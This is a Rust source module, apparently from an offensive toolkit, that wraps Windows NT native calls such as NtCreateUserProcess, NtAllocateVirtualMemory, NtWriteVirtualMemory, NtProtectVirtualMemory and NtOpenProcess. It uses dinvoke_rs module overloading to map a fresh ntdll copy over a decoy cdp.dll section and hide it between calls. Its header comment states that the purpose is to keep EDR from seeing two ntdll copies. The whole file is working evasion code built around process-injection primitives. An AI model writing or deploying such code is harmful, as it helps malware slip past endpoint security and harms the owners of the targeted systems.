//MODULE FLUCTUATION
//This module contains the functions that will be used to dynamically invoke the NtAPI functions, but with the ability to 
//fluctuate the freshly loaded NTDLL module to prevent EDR seeing two copies on NTDLL loaded for the same process.
 

#![allow(non_snake_case, unused_imports)]
use winapi::{
    vc::excpt::{EXCEPTION_CONTINUE_EXECUTION,EXCEPTION_CONTINUE_SEARCH},
    shared::{
        ntdef::{HANDLE, PVOID, OBJECT_ATTRIBUTES, NT_SUCCESS, NTSTATUS, UNICODE_STRING, LIST_ENTRY, SHORT, WCHAR,LONG},
        basetsd::SIZE_T,
        minwindef::{ULONG,DWORD, HMODULE},
        ntstatus::STATUS_SUCCESS,
    },

    um::{
        winnt::{
                THREAD_ALL_ACCESS, CONTEXT, CONTEXT_ALL, IMAGE_NT_HEADERS, IMAGE_SECTION_HEADER, IMAGE_DOS_HEADER,
                IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_EXPORT_DIRECTORY,IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_SIGNATURE, 
                IMAGE_DOS_SIGNATURE, LARGE_INTEGER, MEM_RELEASE, PAGE_EXECUTE_READWRITE, MEMORY_BASIC_INFORMATION, EXCEPTION_POINTERS,
                THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, PROCESS_ALL_ACCESS,
            },
        errhandlingapi::AddVectoredExceptionHandler,
        minwinbase::EXCEPTION_SINGLE_STEP,
    },
};

use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpsapi::{PEB_LDR_DATA, PROCESS_BASIC_INFORMATION, ProcessBasicInformation, PS_ATTRIBUTE, PS_CREATE_INFO, ProcessImageFileName},
    ntpebteb::PEB,
    ntexapi::{SYSTEM_PROCESS_INFORMATION, SystemProcessInformation, SYSTEM_THREAD_INFORMATION, SYSTEM_INFORMATION_CLASS},
    ntrtl::{RtlCreateProcessParametersEx ,RtlDestroyProcessParameters},
    ntobapi::DUPLICATE_SAME_ACCESS,
    ntmmapi::MEMORY_INFORMATION_CLASS,
};
use crate::namoracore::novacore::PS_ATTRIBUTE_LIST;
use crate::namoracore::ntapi::{NtCreateUserProcess, NtAllocateVirtualMemory, NtClose, NtDelayExecution, NtFreeVirtualMemory, 
    NtOpenProcess, NtOpenThread, NtProtectVirtualMemory, NtQueryInformationProcess, NtQuerySystemInformation, NtReadVirtualMemory, 
    NtResumeThread, NtSuspendThread, NtWriteVirtualMemory
};

use winapi::ctypes::c_void;

use dinvoke_rs;
use dinvoke_rs::dmanager::Manager;

use super::ntapi::CLIENT_ID;


pub fn nt_create_user_process_fluctuate(
    process_handle: *mut HANDLE,
    thread_handle: *mut HANDLE,
    process_desired_access: u32,
    thread_desired_access: u32,
    process_object_attributes: *mut OBJECT_ATTRIBUTES,
    thread_object_attributes: *mut OBJECT_ATTRIBUTES,
    process_flags: u32,
    thread_flags: u32,
    process_parameters: *mut c_void,
    create_info: *mut PS_CREATE_INFO,
    attribute_list: *mut PS_ATTRIBUTE_LIST,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtCreateUserProcess;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtCreateUserProcess",
            func_ptr,
            ret,
            process_handle,
            thread_handle,
            process_desired_access,
            thread_desired_access,
            process_object_attributes,
            thread_object_attributes,
            process_flags,
            thread_flags,
            process_parameters,
            create_info,
            attribute_list,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtAllocateVirtualMemory

pub fn nt_allocate_virtual_memory_fluctuate(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: ULONG,
    region_size: *mut SIZE_T,
    allocation_type: ULONG,
    protect: ULONG,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtAllocateVirtualMemory;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtAllocateVirtualMemory",
            func_ptr,
            ret,
            process_handle,
            base_address,
            zero_bits,
            region_size,
            allocation_type,
            protect,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtClose
pub fn nt_close_fluctuate(
    handle: HANDLE,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtClose;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtClose",
            func_ptr,
            ret,
            handle,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtDelayExecution
pub fn nt_delay_execution_fluctuate(
    alertable: bool,
    delay_interval: *mut LARGE_INTEGER,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtDelayExecution;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtDelayExecution",
            func_ptr,
            ret,
            alertable,
            delay_interval,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtProtectVirtualMemory
pub fn nt_protect_virtual_memory_fluctuate(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: *mut SIZE_T,
    protect: ULONG,
    old_protect: *mut ULONG,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtProtectVirtualMemory;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtProtectVirtualMemory",
            func_ptr,
            ret,
            process_handle,
            base_address,
            region_size,
            protect,
            old_protect,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtWriteVirtualMemory
pub fn nt_write_virtual_memory_fluctuate(
    process_handle: HANDLE,
    base_address: PVOID,
    buffer: *mut c_void,
    buffer_size: SIZE_T,
    written_size: *mut SIZE_T,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtWriteVirtualMemory;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtWriteVirtualMemory",
            func_ptr,
            ret,
            process_handle,
            base_address,
            buffer,
            buffer_size,
            written_size,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtReadVirtualMemory
pub fn nt_read_virtual_memory_fluctuate(
    process_handle: HANDLE,
    base_address: PVOID,
    buffer: *mut c_void,
    buffer_size: SIZE_T,
    read_size: *mut SIZE_T,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtReadVirtualMemory;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtReadVirtualMemory",
            func_ptr,
            ret,
            process_handle,
            base_address,
            buffer,
            buffer_size,
            read_size,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtFreeVirtualMemory
pub fn nt_free_virtual_memory_fluctuate(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: *mut SIZE_T,
    free_type: ULONG,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtFreeVirtualMemory;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtFreeVirtualMemory",
            func_ptr,
            ret,
            process_handle,
            base_address,
            region_size,
            free_type,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtOpenProcess
pub fn nt_open_process_fluctuate(
    process_handle: *mut HANDLE,
    desired_access: ULONG,
    object_attributes: *mut OBJECT_ATTRIBUTES,
    client_id: *mut CLIENT_ID,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtOpenProcess;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtOpenProcess",
            func_ptr,
            ret,
            process_handle,
            desired_access,
            object_attributes,
            client_id,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtQueryInformationProcess
pub fn nt_query_information_process_fluctuate(
    process_handle: HANDLE,
    process_information_class: u32,
    process_information: PVOID,
    process_information_length: ULONG,
    return_length: *mut ULONG,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtQueryInformationProcess;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtQueryInformationProcess",
            func_ptr,
            ret,
            process_handle,
            process_information_class,
            process_information,
            process_information_length,
            return_length,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}

//NtOpenThread
pub fn nt_open_thread_fluctuate(
    thread_handle: *mut HANDLE,
    desired_access: ULONG,
    object_attributes: *mut OBJECT_ATTRIBUTES,
    client_id: *mut CLIENT_ID,
) -> NTSTATUS {

    unsafe {
        // The manager will take care of the hiding/remapping process and it can be used in multi-threading scenarios 
    let mut manager = Manager::new();

    // This will map ntdll.dll into a memory section pointing to cdp.dll. 
    // It will return the payload (ntdll) content, the decoy module (cdp) content and the payload base address.
    let overload: ((Vec<u8>, Vec<u8>), usize) = dinvoke_rs::overload::managed_read_and_overload(r"c:\windows\system32\ntdll.dll", r"c:\windows\system32\cdp.dll").unwrap();
    
    // This will allow the manager to start taking care of the module fluctuation process over this mapped PE.
    // Also, it will hide ntdll, replacing its content with the legitimate cdp.dll content.
    let _r = manager.new_module(overload.1, overload.0.0, overload.0.1);

    // Now, if we want to use our fresh ntdll copy, we just need to tell the manager to remap our payload into the memory section.
    let _ = manager.map_module(overload.1);

    let func_ptr: NtOpenThread;
    let ret: Option<NTSTATUS>;
    
    //dynamically invoke the function
        dinvoke_rs::dinvoke::dynamic_invoke!(
            overload.1,
            "NtOpenThread",
            func_ptr,
            ret,
            thread_handle,
            desired_access,
            object_attributes,
            client_id,
    
        );

        let result = match ret {
            Some(x) => x, // Return the value if it's Some
            None => -1,   // Return a default value if it's None
        };

        // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
        let _ = manager.hide_module(overload.1);

        result
    }
    
}